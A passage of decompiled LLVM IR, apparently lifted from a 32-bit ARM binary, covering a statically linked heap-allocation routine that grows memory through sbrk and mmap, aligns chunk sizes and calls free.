  store i32 %v3_16c80, i32* %r2.global-to-local, align 4
  %v1_16c84 = add i32 %v3_16c7c, 1
  store i32 %v1_16c84, i32* %r3.global-to-local, align 4
  %v7_16c8c = icmp sgt i32 %v1_16c84, %v3_16c80
  br i1 %v7_16c8c, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_16c84, i32* %v2_16c80, align 4
  %v0_16c90.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_16c90.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_16c90 = phi i32 [ %v4_16c78, %.thread27 ], [ %v1_16c90.pre, %bb147 ]
  %v0_16c90 = phi i32 [ %v1_16c84, %.thread27 ], [ %v0_16c90.pre, %bb147 ]
  %v2_16c90 = add i32 %v1_16c90, 848
  %v3_16c90 = inttoptr i32 %v2_16c90 to i32*
  store i32 %v0_16c90, i32* %v3_16c90, align 4
  %v0_16c94 = load i32, i32* %ip.global-to-local, align 4
  %v1_16c94 = add i32 %v0_16c94, 868
  %v2_16c94 = inttoptr i32 %v1_16c94 to i32*
  %v3_16c94 = load i32, i32* %v2_16c94, align 4
  store i32 %v3_16c94, i32* %r3.global-to-local, align 4
  %v1_16c98 = add i32 %v0_16c94, 880
  %v2_16c98 = inttoptr i32 %v1_16c98 to i32*
  %v3_16c98 = load i32, i32* %v2_16c98, align 4
  store i32 %v3_16c98, i32* %r2.global-to-local, align 4
  %v0_16c9c = load i32, i32* @r4, align 4
  %v2_16c9c = add i32 %v0_16c9c, %v3_16c94
  store i32 %v2_16c9c, i32* %r1.global-to-local, align 4
  %v1_16ca0 = add i32 %v0_16c94, 872
  %v2_16ca0 = inttoptr i32 %v1_16ca0 to i32*
  %v3_16ca0 = load i32, i32* %v2_16ca0, align 4
  store i32 %v3_16ca0, i32* %r3.global-to-local, align 4
  %v1_16ca8 = add i32 %v0_16c94, 884
  %v2_16ca8 = inttoptr i32 %v1_16ca8 to i32*
  %v3_16ca8 = load i32, i32* %v2_16ca8, align 4
  store i32 %v3_16ca8, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_16c9c, %v3_16c98
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_16c9c, i32* %v2_16c98, align 4
  %v0_16cb0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_16cb0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_16cb0 = phi i32 [ %v0_16c94, %bb148 ], [ %v1_16cb0.pre, %bb149 ]
  %v0_16cb0 = phi i32 [ %v2_16c9c, %bb148 ], [ %v0_16cb0.pre, %bb149 ]
  %v2_16cb0 = add i32 %v1_16cb0, 868
  %v3_16cb0 = inttoptr i32 %v2_16cb0 to i32*
  store i32 %v0_16cb0, i32* %v3_16cb0, align 4
  %v0_16cb4 = load i32, i32* %r1.global-to-local, align 4
  %v1_16cb4 = load i32, i32* %r3.global-to-local, align 4
  %v2_16cb4 = add i32 %v1_16cb4, %v0_16cb4
  store i32 %v2_16cb4, i32* %r1.global-to-local, align 4
  %v1_16cb8 = load i32, i32* %r2.global-to-local, align 4
  %v0_16cbc = load i32, i32* %lr.global-to-local, align 4
  %v1_16cbc = add i32 %v0_16cbc, 8
  store i32 %v1_16cbc, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_16cb4, %v1_16cb8
  br i1 %tmp213, label %bb151, label %dec_label_pc_16fc8

bb151:                                            ; preds = %bb150
  %v5_16cc0 = load i32, i32* %ip.global-to-local, align 4
  %v6_16cc0 = add i32 %v5_16cc0, 884
  %v7_16cc0 = inttoptr i32 %v6_16cc0 to i32*
  store i32 %v2_16cb4, i32* %v7_16cc0, align 4
  br label %dec_label_pc_16fc8

dec_label_pc_16cc8:                               ; preds = %dec_label_pc_16c0c, %dec_label_pc_16bec, %dec_label_pc_16c20.dec_label_pc_16cc8_crit_edge, %dec_label_pc_16bfc
  %v1_16cec = phi i32 [ %v1_16cec.pre, %dec_label_pc_16c20.dec_label_pc_16cc8_crit_edge ], [ %v0_16b94, %dec_label_pc_16bfc ], [ %v0_16b94, %dec_label_pc_16bec ], [ %v0_16b94, %dec_label_pc_16c0c ]
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %ip.global-to-local, align 4
  %v4_16cd0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 36) to i32*), align 4
  store i32 %v4_16cd0, i32* %r3.global-to-local, align 4
  %v1_16cd4 = add i32 %v4_16cd0, 44
  %v2_16cd4 = inttoptr i32 %v1_16cd4 to i32*
  %v3_16cd4 = load i32, i32* %v2_16cd4, align 4
  store i32 %v3_16cd4, i32* %r0.global-to-local, align 4
  %v1_16cd8 = add i32 %v4_16cd0, 864
  %v2_16cd8 = inttoptr i32 %v1_16cd8 to i32*
  %v3_16cd8 = load i32, i32* %v2_16cd8, align 4
  store i32 %v3_16cd8, i32* %r2.global-to-local, align 4
  %v1_16cdc = add i32 %v4_16cd0, 840
  %v2_16cdc = inttoptr i32 %v1_16cdc to i32*
  %v3_16cdc = load i32, i32* %v2_16cdc, align 4
  store i32 %v3_16cdc, i32* %r3.global-to-local, align 4
  %v1_16ce0 = add i32 %v3_16cd4, 4
  %v2_16ce0 = inttoptr i32 %v1_16ce0 to i32*
  %v3_16ce0 = load i32, i32* %v2_16ce0, align 4
  store i32 %v3_16ce0, i32* %r1.global-to-local, align 4
  %v1_16ce8 = urem i32 %v3_16cd8, 2
  %v2_16ce8 = icmp eq i32 %v1_16ce8, 0
  %v1_16ce4 = add i32 %v1_16cec, 16
  %v2_16cec = add i32 %v1_16ce4, %v3_16cdc
  store i32 %v2_16cec, i32* %r3.global-to-local, align 4
  %v1_16cf0 = and i32 %v3_16ce0, -4
  store i32 %v1_16cf0, i32* @r8, align 4
  br i1 %v2_16ce8, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_16cc8
  %v3_16cf4 = sub i32 %v2_16cec, %v1_16cf0
  store i32 %v3_16cf4, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_16cc8, %bb152
  %v0_16cf8 = phi i32 [ %v2_16cec, %dec_label_pc_16cc8 ], [ %v3_16cf4, %bb152 ]
  %v1_16cf8 = load i32, i32* %sb.global-to-local, align 4
  %v2_16cf8 = add i32 %v1_16cf8, %v0_16cf8
  store i32 %v2_16cf8, i32* %r3.global-to-local, align 4
  %v1_16cfc = sub i32 -1, %v1_16cf8
  store i32 %v1_16cfc, i32* %fp.global-to-local, align 4
  %v2_16d00 = and i32 %v2_16cf8, %v1_16cfc
  store i32 %v2_16d00, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_16d00, 1
  br i1 %tmp154, label %dec_label_pc_16d24, label %dec_label_pc_16d10

dec_label_pc_16d10:                               ; preds = %bb153
  store i32 %v2_16d00, i32* %r0.global-to-local, align 4
  %v1_16d14 = call i32 @__GI_sbrk(i32 %v2_16d00)
  store i32 %v1_16d14, i32* %r0.global-to-local, align 4
  %v3_16d18 = icmp eq i32 %v1_16d14, -1
  store i32 %v1_16d14, i32* @r4, align 4
  br i1 %v3_16d18, label %dec_label_pc_16d24, label %dec_label_pc_16d90

dec_label_pc_16d24:                               ; preds = %dec_label_pc_16d10, %bb153
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r1.global-to-local, align 4
  %v4_16d2c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 36) to i32*), align 4
  store i32 %v4_16d2c, i32* %r6.global-to-local, align 4
  %v1_16d30 = add i32 %v4_16d2c, 864
  %v2_16d30 = inttoptr i32 %v1_16d30 to i32*
  %v3_16d30 = load i32, i32* %v2_16d30, align 4
  store i32 %v3_16d30, i32* %r3.global-to-local, align 4
  %v1_16d34 = urem i32 %v3_16d30, 2
  %v2_16d34 = icmp eq i32 %v1_16d34, 0
  br i1 %v2_16d34, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_16d24
  %v1_16d38 = load i32, i32* @r8, align 4
  %v2_16d38 = load i32, i32* %sb.global-to-local, align 4
  %v3_16d38 = add i32 %v2_16d38, %v1_16d38
  %v2_16d3c = load i32, i32* @r5, align 4
  %v3_16d3c = add i32 %v3_16d38, %v2_16d3c
  store i32 %v3_16d3c, i32* %r3.global-to-local, align 4
  %v2_16d40 = load i32, i32* %fp.global-to-local, align 4
  %v3_16d40 = and i32 %v2_16d40, %v3_16d3c
  store i32 %v3_16d40, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_16d24
  %v0_16d44.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_16d44 = phi i32 [ %v0_16d44.pr, %.thread29thread-pre-split ], [ %v3_16d40, %bb155 ]
  %v2_16d44 = icmp ugt i32 %v0_16d44, 1048575
  br i1 %v2_16d44, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_16d5c = phi i32 [ %v0_16d44, %.thread29 ], [ 1048576, %bb156 ]
  %v1_16d4c = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_16d5c, %v1_16d4c
  br i1 %tmp214, label %dec_label_pc_16d54, label %dec_label_pc_16fb8

dec_label_pc_16d54:                               ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_16d5c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_16d70 = call i32 @mmap(i32 0, i32 %v0_16d5c, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_16d70, i32* %r0.global-to-local, align 4
  %v3_16d74 = icmp eq i32 %v6_16d70, -1
  %v8_16d74 = icmp eq i32 %v6_16d70, -1
  store i32 %v6_16d70, i32* @r4, align 4
  br i1 %v8_16d74, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_16d54
  %v1_16d7c = load i32, i32* %r6.global-to-local, align 4
  %v2_16d7c = add i32 %v1_16d7c, 864
  %v3_16d7c = inttoptr i32 %v2_16d7c to i32*
  %v4_16d7c = load i32, i32* %v3_16d7c, align 4
  %v2_16d80 = load i32, i32* @r5, align 4
  %v3_16d80 = add i32 %v2_16d80, %v6_16d70
  store i32 %v3_16d80, i32* %r0.global-to-local, align 4
  %v2_16d84 = and i32 %v4_16d7c, -2
  store i32 %v2_16d84, i32* %r3.global-to-local, align 4
  store i32 %v2_16d84, i32* %v3_16d7c, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_16d54, %bb158
  br i1 %v3_16d74, label %dec_label_pc_16d90, label %dec_label_pc_16d94

dec_label_pc_16d90:                               ; preds = %.thread32, %dec_label_pc_16d10
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16d94

dec_label_pc_16d94:                               ; preds = %.thread32, %dec_label_pc_16d90
  %v0_16d94 = load i32, i32* @r4, align 4
  %v7_16d94 = icmp eq i32 %v0_16d94, -1
  br i1 %v7_16d94, label %dec_label_pc_16fb8, label %dec_label_pc_16d9c

dec_label_pc_16d9c:                               ; preds = %dec_label_pc_16d94
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r2.global-to-local, align 4
  %v4_16da4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 36) to i32*), align 4
  store i32 %v4_16da4, i32* %ip.global-to-local, align 4
  store i32 %v3_16cd4, i32* %r2.global-to-local, align 4
  %v1_16dac = add i32 %v4_16da4, 872
  %v2_16dac = inttoptr i32 %v1_16dac to i32*
  %v3_16dac = load i32, i32* %v2_16dac, align 4
  %v1_16db0 = load i32, i32* @r8, align 4
  %v2_16db0 = add i32 %v1_16db0, %v3_16cd4
  store i32 %v2_16db0, i32* %r1.global-to-local, align 4
  %v0_16db4 = load i32, i32* @r5, align 4
  %v2_16db4 = add i32 %v0_16db4, %v3_16dac
  store i32 %v2_16db4, i32* %r3.global-to-local, align 4
  %v9_16db8 = icmp eq i32 %v0_16d94, %v2_16db0
  br i1 %v9_16db8, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_16d9c
  store i32 %v2_16db4, i32* %v2_16dac, align 4
  br label %dec_label_pc_16dd4

bb159:                                            ; preds = %dec_label_pc_16d9c
  %v1_16dbc = load i32, i32* %r0.global-to-local, align 4
  %v8_16dbc = icmp eq i32 %v1_16dbc, -1
  store i32 %v2_16db4, i32* %v2_16dac, align 4
  br i1 %v8_16dbc, label %.thread34, label %dec_label_pc_16dd4

.thread34:                                        ; preds = %bb159
  %v1_16dc4 = load i32, i32* @r5, align 4
  %v2_16dc4 = load i32, i32* @r8, align 4
  %v3_16dc4 = add i32 %v2_16dc4, %v1_16dc4
  %v2_16dc8 = or i32 %v3_16dc4, 1
  store i32 %v2_16dc8, i32* %r3.global-to-local, align 4
  %v2_16dcc = load i32, i32* %r2.global-to-local, align 4
  %v3_16dcc = add i32 %v2_16dcc, 4
  %v4_16dcc = inttoptr i32 %v3_16dcc to i32*
  store i32 %v2_16dc8, i32* %v4_16dcc, align 4
  br label %dec_label_pc_16f4c

dec_label_pc_16dd4:                               ; preds = %bb159, %.thread122
  %v0_16dd8.pr = load i32, i32* @r8, align 4
  %v0_16dd4 = load i32, i32* %ip.global-to-local, align 4
  %v1_16dd4 = add i32 %v0_16dd4, 864
  %v2_16dd4 = inttoptr i32 %v1_16dd4 to i32*
  %v3_16dd4 = load i32, i32* %v2_16dd4, align 4
  store i32 %v3_16dd4, i32* %r2.global-to-local, align 4
  %v2_16dd8 = icmp eq i32 %v0_16dd8.pr, 0
  br i1 %v2_16dd8, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_16dd4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_16dd4
  %v2_16de0 = urem i32 %v3_16dd4, 2
  store i32 %v2_16de0, i32* %r3.global-to-local, align 4
  %v2_16de4 = icmp eq i32 %v2_16de0, 0
  br i1 %v2_16de4, label %.thread40, label %dec_label_pc_16dec

dec_label_pc_16dec:                               ; preds = %.thread36
  %v0_16dec = load i32, i32* @r4, align 4
  %v1_16dec = load i32, i32* %r1.global-to-local, align 4
  %v3_16dec = icmp ult i32 %v0_16dec, %v1_16dec
  br i1 %v3_16dec, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_16dec
  %v2_16df0 = and i32 %v3_16dd4, -2
  store i32 %v2_16df0, i32* %r3.global-to-local, align 4
  store i32 %v2_16df0, i32* %v2_16dd4, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_16dec, %.thread37, %.thread36, %bb160
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %ip.global-to-local, align 4
  %v4_16e00 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 36) to i32*), align 4
  store i32 %v4_16e00, i32* @r7, align 4
  %v1_16e04 = add i32 %v4_16e00, 864
  %v2_16e04 = inttoptr i32 %v1_16e04 to i32*
  %v3_16e04 = load i32, i32* %v2_16e04, align 4
  store i32 %v3_16e04, i32* %r3.global-to-local, align 4
  %v1_16e08 = urem i32 %v3_16e04, 2
  store i32 %v1_16e08, i32* @r6, align 4
  %v2_16e08 = icmp eq i32 %v1_16e08, 0
  br i1 %v2_16e08, label %dec_label_pc_16e9c, label %dec_label_pc_16e10

dec_label_pc_16e10:                               ; preds = %.thread40
  %v0_16e10 = load i32, i32* @r8, align 4
  %v2_16e10 = icmp eq i32 %v0_16e10, 0
  br i1 %v2_16e10, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_16e10
  %v2_16e14 = add i32 %v4_16e00, 872
  %v3_16e14 = inttoptr i32 %v2_16e14 to i32*
  %v4_16e14 = load i32, i32* %v3_16e14, align 4
  store i32 %v4_16e14, i32* %r2.global-to-local, align 4
  %v1_16e18 = load i32, i32* %r1.global-to-local, align 4
  %v2_16e18 = load i32, i32* @r4, align 4
  %v3_16e18 = sub i32 %v2_16e18, %v1_16e18
  %v3_16e1c = add i32 %v3_16e18, %v4_16e14
  store i32 %v3_16e1c, i32* %r3.global-to-local, align 4
  store i32 %v3_16e1c, i32* %v3_16e14, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_16e10, %bb161
  %v0_16e24 = load i32, i32* @r4, align 4
  %v1_16e24 = urem i32 %v0_16e24, 8
  store i32 %v1_16e24, i32* %r3.global-to-local, align 4
  %v2_16e24 = icmp eq i32 %v1_16e24, 0
  br i1 %v2_16e24, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_16e28 = sub nsw i32 8, %v1_16e24
  store i32 %v2_16e28, i32* %r3.global-to-local, align 4
  %v3_16e2c = add i32 %v2_16e28, %v0_16e24
  store i32 %v3_16e2c, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_16e34 = phi i32 [ 0, %.thread43 ], [ %v2_16e28, %bb162 ]
  %v1_16e30 = load i32, i32* @r5, align 4
  %v2_16e30 = add i32 %v1_16e30, %v0_16e24
  store i32 %v2_16e30, i32* @r6, align 4
  %v1_16e34 = load i32, i32* @r8, align 4
  %v2_16e34 = add i32 %v2_16e30, %v0_16e34
  %v2_16e38 = add i32 %v2_16e34, %v1_16e34
  store i32 %v2_16e38, i32* %r1.global-to-local, align 4
  %v1_16e3c = load i32, i32* %sb.global-to-local, align 4
  %v2_16e3c = add i32 %v1_16e3c, %v2_16e38
  %v1_16e40 = load i32, i32* %fp.global-to-local, align 4
  %v2_16e40 = and i32 %v1_16e40, %v2_16e3c
  store i32 %v2_16e40, i32* %r2.global-to-local, align 4
  %v2_16e44 = sub i32 0, %v2_16e30
  store i32 %v2_16e44, i32* %r3.global-to-local, align 4
  %v2_16e48 = sub i32 %v2_16e40, %v2_16e30
  store i32 %v2_16e48, i32* @r5, align 4
  store i32 %v2_16e48, i32* %r0.global-to-local, align 4
  br i1 %v2_16e24, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_16e24, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_16e54 = call i32 @__GI_sbrk(i32 %v2_16e48)
  store i32 %v1_16e54, i32* %r0.global-to-local, align 4
  %v3_16e58 = icmp eq i32 %v1_16e54, -1
  br i1 %v3_16e58, label %dec_label_pc_16e60, label %dec_label_pc_16e70

dec_label_pc_16e60:                               ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_16e64 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_16e64, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_16ec8

dec_label_pc_16e70:                               ; preds = %bb164
  %v1_16e70 = load i32, i32* @r4, align 4
  %v3_16e70 = icmp ult i32 %v1_16e54, %v1_16e70
  br i1 %v3_16e70, label %dec_label_pc_16e78, label %dec_label_pc_16ec8

dec_label_pc_16e78:                               ; preds = %dec_label_pc_16e70
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r0.global-to-local, align 4
  %v4_16e80 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 36) to i32*), align 4
  store i32 %v4_16e80, i32* %r2.global-to-local, align 4
  %v1_16e84 = add i32 %v4_16e80, 864
  %v2_16e84 = inttoptr i32 %v1_16e84 to i32*
  %v3_16e84 = load i32, i32* %v2_16e84, align 4
  %v0_16e88 = load i32, i32* @r6, align 4
  store i32 %v0_16e88, i32* %r0.global-to-local, align 4
  %v1_16e8c = and i32 %v3_16e84, -2
  store i32 %v1_16e8c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_16e8c, i32* %v2_16e84, align 4
  br label %dec_label_pc_16ec8

dec_label_pc_16e9c:                               ; preds = %.thread40
  %v0_16e9c = load i32, i32* %r0.global-to-local, align 4
  %v3_16e9c = icmp eq i32 %v0_16e9c, -1
  br i1 %v3_16e9c, label %dec_label_pc_16ea4, label %dec_label_pc_16ec0

dec_label_pc_16ea4:                               ; preds = %dec_label_pc_16e9c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_16ea8 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_16ea8, i32* %r0.global-to-local, align 4
  %v0_16eac = load i32, i32* @r7, align 4
  %v1_16eac = add i32 %v0_16eac, 872
  %v2_16eac = inttoptr i32 %v1_16eac to i32*
  %v3_16eac = load i32, i32* %v2_16eac, align 4
  store i32 %v3_16eac, i32* %r2.global-to-local, align 4
  %v0_16eb0 = load i32, i32* @r4, align 4
  %v0_16eb4 = load i32, i32* @r5, align 4
  %v2_16eb0 = add i32 %v3_16eac, %v1_16ea8
  %v2_16eb4 = sub i32 %v2_16eb0, %v0_16eb0
  %v2_16eb8 = sub i32 %v2_16eb4, %v0_16eb4
  store i32 %v2_16eb8, i32* %r3.global-to-local, align 4
  store i32 %v2_16eb8, i32* %v2_16eac, align 4
  %v0_16ec4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16ec0

dec_label_pc_16ec0:                               ; preds = %dec_label_pc_16e9c, %dec_label_pc_16ea4
  %v0_16ec4 = phi i32 [ 0, %dec_label_pc_16e9c ], [ %v0_16ec4.pre, %dec_label_pc_16ea4 ]
  %v0_16ec0 = load i32, i32* @r4, align 4
  store i32 %v0_16ec0, i32* @r7, align 4
  store i32 %v0_16ec4, i32* @r5, align 4
  br label %dec_label_pc_16ec8

dec_label_pc_16ec8:                               ; preds = %dec_label_pc_16e70, %dec_label_pc_16e78, %dec_label_pc_16e60, %dec_label_pc_16ec0
  %v0_16ec8 = load i32, i32* %r0.global-to-local, align 4
  %v7_16ec8 = icmp eq i32 %v0_16ec8, -1
  br i1 %v7_16ec8, label %dec_label_pc_16f4c, label %dec_label_pc_16ed0

dec_label_pc_16ed0:                               ; preds = %dec_label_pc_16ec8
  %v1_16ed0 = load i32, i32* @r5, align 4
  %v2_16ed0 = add i32 %v1_16ed0, %v0_16ec8
  %v0_16ed4 = load i32, i32* @r7, align 4
  %v2_16ed4 = sub i32 %v2_16ed0, %v0_16ed4
  %v1_16ed8 = or i32 %v2_16ed4, 1
  %v2_16edc = add i32 %v0_16ed4, 4
  %v3_16edc = inttoptr i32 %v2_16edc to i32*
  store i32 %v1_16ed8, i32* %v3_16edc, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r1.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_16ee8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 36) to i32*), align 4
  store i32 %v4_16ee8, i32* @r6, align 4
  %v1_16eec = add i32 %v4_16ee8, 872
  %v2_16eec = inttoptr i32 %v1_16eec to i32*
  %v3_16eec = load i32, i32* %v2_16eec, align 4
  %v0_16ef0 = load i32, i32* @r8, align 4
  %v2_16ef0 = icmp eq i32 %v0_16ef0, 0
  %v0_16ef4 = load i32, i32* @r5, align 4
  %v2_16ef4 = add i32 %v0_16ef4, %v3_16eec
  store i32 %v2_16ef4, i32* %r3.global-to-local, align 4
  store i32 %v2_16ef4, i32* %v2_16eec, align 4
  %v0_16efc = load i32, i32* @r7, align 4
  %v1_16efc = load i32, i32* @r6, align 4
  %v2_16efc = add i32 %v1_16efc, 44
  %v3_16efc = inttoptr i32 %v2_16efc to i32*
  store i32 %v0_16efc, i32* %v3_16efc, align 4
  br i1 %v2_16ef0, label %dec_label_pc_16f4c, label %dec_label_pc_16f04

dec_label_pc_16f04:                               ; preds = %dec_label_pc_16ed0
  %v0_16f08 = load i32, i32* @r8, align 4
  %v1_16f08 = add i32 %v0_16f08, -12
  %v1_16f0c = and i32 %v1_16f08, -8
  store i32 %v3_16cd4, i32* %ip.global-to-local, align 4
  %v2_16f14 = add i32 %v1_16f0c, %v3_16cd4
  store i32 %v2_16f14, i32* %r1.global-to-local, align 4
  %v2_16f18 = icmp ugt i32 %v1_16f0c, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_16f20 = or i32 %v1_16f0c, 1
  store i32 %v1_16f20, i32* %r3.global-to-local, align 4
  store i32 %v1_16f20, i32* %v2_16ce0, align 4
  %v0_16f28 = load i32, i32* %r2.global-to-local, align 4
  %v1_16f28 = load i32, i32* %r1.global-to-local, align 4
  %v2_16f28 = add i32 %v1_16f28, 8
  %v3_16f28 = inttoptr i32 %v2_16f28 to i32*
  store i32 %v0_16f28, i32* %v3_16f28, align 4
  %v0_16f2c = load i32, i32* %r2.global-to-local, align 4
  %v1_16f2c = load i32, i32* %r1.global-to-local, align 4
  %v2_16f2c = add i32 %v1_16f2c, 4
  %v3_16f2c = inttoptr i32 %v2_16f2c to i32*
  store i32 %v0_16f2c, i32* %v3_16f2c, align 4
  br i1 %v2_16f18, label %dec_label_pc_16f34, label %dec_label_pc_16f4c

dec_label_pc_16f34:                               ; preds = %dec_label_pc_16f04
  %v0_16f34 = load i32, i32* @r6, align 4
  %v1_16f34 = add i32 %v0_16f34, 836
  %v2_16f34 = inttoptr i32 %v1_16f34 to i32*
  %v3_16f34 = load i32, i32* %v2_16f34, align 4
  store i32 %v3_16f34, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_16f3c = load i32, i32* %ip.global-to-local, align 4
  %v1_16f3c = add i32 %v0_16f3c, 8
  store i32 %v1_16f3c, i32* @r0, align 4
  store i32 -1, i32* %v2_16f34, align 4
  %v0_16f44 = call i32 @free()
  store i32 %v0_16f44, i32* %r0.global-to-local, align 4
  %v0_16f48 = load i32, i32* @r4, align 4
  %v1_16f48 = load i32, i32* @r6, align 4
  %v2_16f48 = add i32 %v1_16f48, 836
  %v3_16f48 = inttoptr i32 %v2_16f48 to i32*
  store i32 %v0_16f48, i32* %v3_16f48, align 4
  br label %dec_label_pc_16f4c

dec_label_pc_16f4c:                               ; preds = %.thread34, %dec_label_pc_16f04, %dec_label_pc_16ed0, %dec_label_pc_16ec8, %dec_label_pc_16f34
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r0.global-to-local, align 4
  %v4_16f54 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 36) to i32*), align 4
  store i32 %v4_16f54, i32* %lr.global-to-local, align 4
  %v1_16f58 = add i32 %v4_16f54, 872
  store i32 %v1_16f58, i32* %r1.global-to-local, align 4
  %v1_16f5c = inttoptr i32 %v1_16f58 to i32*
  %v2_16f5c = load i32, i32* %v1_16f5c, align 4
  store i32 %v2_16f5c, i32* %r1.global-to-local, align 4
  %v3_16f5c = add i32 %v4_16f54, 876
  %v4_16f5c = inttoptr i32 %v3_16f5c to i32*
  %v5_16f5c = load i32, i32* %v4_16f5c, align 4
  store i32 %v5_16f5c, i32* %r3.global-to-local, align 4
  %v1_16f64 = add i32 %v4_16f54, 868
  %v2_16f64 = inttoptr i32 %v1_16f64 to i32*
  %v3_16f64 = load i32, i32* %v2_16f64, align 4
  store i32 %v3_16f64, i32* %r3.global-to-local, align 4
  %v1_16f68 = add i32 %v4_16f54, 884
  %v2_16f68 = inttoptr i32 %v1_16f68 to i32*
  %v3_16f68 = load i32, i32* %v2_16f68, align 4
  store i32 %v3_16f68, i32* %r2.global-to-local, align 4
  %v2_16f6c = add i32 %v3_16f64, %v2_16f5c
  store i32 %v2_16f6c, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_16f5c, %v5_16f5c
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_16f4c
  store i32 %v2_16f5c, i32* %v4_16f5c, align 4
  %v0_16f74.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_16f74.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_16f4c, %bb165
  %v1_16f74 = phi i32 [ %v3_16f68, %dec_label_pc_16f4c ], [ %v1_16f74.pre, %bb165 ]
  %v4_16f78 = phi i32 [ %v2_16f6c, %dec_label_pc_16f4c ], [ %v0_16f74.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_16f78, %v1_16f74
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_16f78 = load i32, i32* %lr.global-to-local, align 4
  %v6_16f78 = add i32 %v5_16f78, 884
  %v7_16f78 = inttoptr i32 %v6_16f78 to i32*
  store i32 %v4_16f78, i32* %v7_16f78, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_16f7c = load i32, i32* %lr.global-to-local, align 4
  %v1_16f7c = add i32 %v0_16f7c, 44
  %v2_16f7c = inttoptr i32 %v1_16f7c to i32*
  %v3_16f7c = load i32, i32* %v2_16f7c, align 4
  store i32 %v3_16f7c, i32* %ip.global-to-local, align 4
  %v1_16f80 = add i32 %v3_16f7c, 4
  %v2_16f80 = inttoptr i32 %v1_16f80 to i32*
